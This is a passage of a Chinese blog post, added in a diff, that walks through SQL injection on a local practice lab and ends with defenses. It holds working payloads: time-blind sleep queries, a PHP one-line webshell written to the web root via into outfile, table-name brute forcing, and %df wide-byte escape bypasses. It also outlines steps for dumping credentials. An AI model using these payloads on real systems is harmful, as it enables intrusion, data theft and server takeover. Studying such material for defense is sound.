class="hljs-number">5</span><span class="hljs-punctuation">)</span>,null<span class="hljs-punctuation">)</span>#<br></code></pre></td></tr></table></figure>
+if函数结果如果为真，那么就会进行sleep（5）效果如下：<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/99.png" srcset="/img/loading.gif" lazyload alt="time盲注比较结果" idth="700"/></li>
+</ol>
+<h3 id="OS远程控制"><a href="#OS远程控制" class="headerlink" title="OS远程控制"></a>OS远程控制</h3><p>利用一句话木马（恶意代码）构造木马程序，执行木马程序对客户端进行远程控制。<br>PHP：<?php @eval($_POST['chopper']);?></p>
+<ol>
+<li><p>利用into outfile这个方法进行文件的写入。前提条件是：知道远程目录，并且具有权限，数据库开启secure_file_priv。</p>
+</li>
+<li><p>在字符型注入界面输入以下payload：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; union select &quot;<span class="hljs-meta">&lt;?php @eval($_GET[&#x27;test&#x27;])?&gt;</span>&quot;,2 into outfile &quot;C:\\Software\\phpstudy_pro\\WWW\\1.php&quot;#<br></code></pre></td></tr></table></figure>
+<p>打开文件相关目录可以看到对应的1.php。</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/100.png" srcset="/img/loading.gif" lazyload alt="1.php" idth="700"/>
+</li>
+<li><p>我们利用url访问这个文件：localhost:84&#x2F;1.php?test&#x3D;phpinfo();。</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/101.png" srcset="/img/loading.gif" lazyload alt="木马结果" idth="700"/></li>
+</ol>
+<h3 id="利用暴力破解获取表名列名"><a href="#利用暴力破解获取表名列名" class="headerlink" title="利用暴力破解获取表名列名"></a>利用暴力破解获取表名列名</h3><ol>
+<li><p>仍然选择字符型输入页面，输入以下payload1,2进行测试(aa是字典)：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and exists(select * from aa)#<br></code></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">kobe&#x27; and exists(select id from users)#<br></code></pre></td></tr></table></figure>
+<p>输入payload1后，页面显示数据库不存在aa，所以我们在bp里找到对应的数据包，并发送到Intruder中，并在aa处增加payload。</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/102.png" srcset="/img/loading.gif" lazyload alt="aa的payload位置" idth="700"/>
+</li>
+<li><p>模式采用狙击手模式，因为只有一个payload，再进行一个简单的字典配置。</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/103.png" srcset="/img/loading.gif" lazyload alt="简易字典配置" idth="700"/>
+</li>
+<li><p>然后开始攻击，结果如下图，可以发现user的返回长度与其他的不一样，说明本次暴力破解成功。</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/104.png" srcset="/img/loading.gif" lazyload alt="暴力破解结果" idth="700"/></li>
+</ol>
+<p>payload2的思路与这1几乎一模一样所以在这里就不进行演示。</p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><ol>
+<li><p>还是测试输入，lucy以及随机输入，lucy会查询出信息，随机输入会提示用户名不存在。所以还是构造一个闭合去查询所有数据。但是之前的大部分payload输入不行，因为会进行转义，会使闭合失效。我们要进行绕过转义。</p>
+</li>
+<li><p>但是我们利用%df进行绕过转义，也可以获取全部信息。将本次请求的数据包在bp中找到，然后发送到Repeater，将name字节的内容换成以下payload。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">111%df<br></code></pre></td></tr></table></figure>
+<p>效果如下：</p>
+<img src="https://raw.githubusercontent.com/llppff573/blog-image/main/images/105.png" srcset="/img/loading.gif" lazyload alt="宽字节注入结果" idth="700"/></li>
+</ol>
+<h2 id="SQL-注入-整体总结（适配你当前-Hexo-博客笔记风格，放在全文末尾）"><a href="#SQL-注入-整体总结（适配你当前-Hexo-博客笔记风格，放在全文末尾）" class="headerlink" title="SQL 注入 整体总结（适配你当前 Hexo 博客笔记风格，放在全文末尾）"></a>SQL 注入 整体总结（适配你当前 Hexo 博客笔记风格，放在全文末尾）</h2><p>SQL 注入漏洞的根源是<strong>用户可控输入直接拼接进 SQL 语句执行</strong>，后端未使用预编译（PDO），攻击者可以通过构造特殊字符闭合原有 SQL 语义，篡改数据库查询逻辑，读取、修改甚至删除数据。漏洞发生在数据库层，是 Web 安全中高危漏洞。</p>
+<ol>
+<li><strong>按参数类型</strong><br>数字型：参数不带引号包裹，直接构造<code>or 1=1</code>即可；<br>字符型：参数被单 &#x2F; 双引号包裹，必须先闭合引号，再用<code>#</code>注释掉 SQL 剩余部分。<br>搜索型：属于字符型变种，SQL 使用<code>like &#39;%xxx%&#39;</code>模糊查询，payload 需要适配<code>%</code>通配符。<br>XX 型：SQL 被括号包裹，payload 需要同时闭合括号与引号。</li>
+<li><strong>按数据回显方式</strong><br>联合查询注入：页面直接返回查询结果，最简单，利用<code>union select</code>查询额外数据，要求前后查询字段数量一致；<br>报错注入：页面输出数据库报错信息，借助<code>updatexml()</code>、<code>extractvalue()</code>、<code>floor()</code>等函数，把查询数据带入报错信息带出；<br>布尔盲注：页面只有两种状态（存在 &#x2F; 不存在），无报错、无数据回显，通过<code>ascii()</code>、<code>substr()</code>逐字符猜解数据；<br>时间盲注：页面完全无变化，依靠<code>sleep()</code>结合<code>if()</code>函数，根据页面响应延时判断语句真假，适合完全无回显场景。</li>
+<li><strong>按提交位置</strong><br>GET 注入：参数放在 URL；POST 注入：参数放在表单请求体；Cookie 注入：参数从 Cookie 中读取；HTTP Header 注入：注入点在 User-Agent、Referer 等请求头，后端将 Header 内容直接拼接 SQL。</li>
+<li><strong>特殊注入：宽字节注入</strong><br>后端使用<code>addslashes()</code>转义单引号（<code>&#39;</code>→<code>\&#39;</code>），同时 MySQL 客户端编码设置为 GBK。GBK 为双字节编码，传入高位字节如<code>%df</code>，<code>%df%5c</code>会被 MySQL 解析成一个汉字，吃掉反斜杠，让单引号成功逃逸转义过滤。仅 GBK 环境存在，utf8mb4 不存在该漏洞。Payload 经典为<code>%df&#39; or 1=1#</code>，sqlmap 可使用<code>unmagicquotes</code>脚本自动绕过。</li>
+</ol>
+<h3 id="拓展攻击手段"><a href="#拓展攻击手段" class="headerlink" title="拓展攻击手段"></a>拓展攻击手段</h3><ol>
+<li>文件写入：满足<code>secure_file_priv</code>权限、知道网站物理路径时，使用<code>into outfile</code>写入一句话木马，获取服务器 Web 权限。</li>
+<li>暴力猜解表 &#x2F; 字段：Burp Intruder 爆破，结合<code>exists()</code>语句，通过页面响应差异判断表名、字段名是否存在。</li>
+<li>Insert&#x2F;Update&#x2F;Delete 注入：不止查询语句存在注入，增删改语句只要拼接用户输入，同样可以构造报错注入获取数据。</li>
+</ol>
+<h3 id="漏洞利用通用流程"><a href="#漏洞利用通用流程" class="headerlink" title="漏洞利用通用流程"></a>漏洞利用通用流程</h3><ol>
+<li>探测：输入单引号<code>&#39;</code>，观察页面是否报错 &#x2F; 状态变化，判断是否存在注入、是字符还是数字型；</li>
+<li>闭合：构造 payload 闭合原有 SQL 引号、括号，注释多余语句；</li>
+<li>探测字段数：<code>order by</code>判断查询列数；</li>
+<li>信息获取：查询数据库版本、当前库名、表名、字段；</li>
+<li>脱库：读取账号密码等敏感数据；</li>
+<li>拓展攻击：写入木马、读写文件（权限允许）。</li>
+</ol>
+<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><ol>
+<li><strong>优先使用预编译（PDO）</strong>，参数化查询，将 SQL 语句与用户输入完全分离，从根源杜绝注入；</li>
+<li>统一数据库连接编码为<code>utf8mb4</code>，禁止使用 GBK，防御宽字节注入；</li>
+<li>输入校验：采用白名单，严格过滤特殊字符，不要依赖<code>addslashes</code>这类简单转义；</li>
+<li>最小权限原则：数据库账号只分配必要权限，禁止<code>file_priv</code>文件读写权限；</li>
+<li>关闭前端数据库原生报错，屏蔽敏感报错信息；</li>
+<li>WAF 部署，拦截常见注入特征 Payload。</li>
+</ol>
+<h3 id="工具补充"><a href="#工具补充" class="headerlink" title="工具补充"></a>工具补充</h3><p>手动测试使用 Burp Suite 抓包修改请求，Repeater 重复发包；sqlmap 为自动化注入工具，可一键探测、脱库，搭配 tamper 脚本完成各类绕过。仅用于本地靶场安全练习，禁止未经授权测试公网网站。</p>
+
                 
               </div>
             
